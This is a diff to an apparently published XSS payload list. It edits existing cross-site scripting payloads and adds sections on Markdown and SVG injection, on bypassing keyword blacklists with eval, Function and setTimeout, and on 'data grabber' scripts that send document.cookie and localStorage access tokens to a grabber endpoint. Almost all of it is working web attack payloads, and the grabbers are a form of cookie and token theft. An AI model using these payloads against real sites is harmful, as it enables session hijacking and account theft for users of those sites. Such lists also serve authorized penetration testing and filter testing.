@@ -221,11 +221,11 @@ tags:
 "><iframe/src=javascript:alert%26%23x000000028%3b)> 
 %22%3E%3Ciframe/src%3Djavascript%3Aalert%2526%2523x000000028%253b%29%3E%0A 
 <svg onload=prompt%26%230000000040document.domain)> 
-<h1 onmouseover="alert('karem')" style="color: red;">karem</h1> 
+"'--<h1 onmouseover="alert('karem')" style="color: red;">karem</h1> 
 "><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)> 
 "><a href="javascript:alert('xss')">clickme</a>
 <svg onload=prompt%26%230000000040document.domain)> 
- '"><script>alert('karem')</script>@gmail.com 
+'"><script>alert('karem')</script>@gmail.com 
 %0Dalert`1`// 
 "<script>alert</script>"@gmail.com 
 "><img src=1 OnErRoR=alert('xss')> 
@@ -247,10 +247,38 @@ tags:
 %2sscript%2ualert()%2s/script%2u
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 toString=\\\\u0061lert;window+' '
-aaaaa<h1 onclick=alert(1)>test
+"'-->aaaaa<h1 onclick=alert(1)>test
 <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
 " onfocus="alert(1)" autofocus="
-"><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
+''"--><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
+"'--><img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+
+# XSS in Markdown
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+
+# XSS in SVG (short)
+<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+
+# Bypass word blacklist with code evaluation
+eval('ale'+'rt(0)');
+Function('ale'+'rt(1)')();
+new Function`alert`6``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`alert(14)```;
+
+# Data grabber for XSS
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
+<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
 
 
 
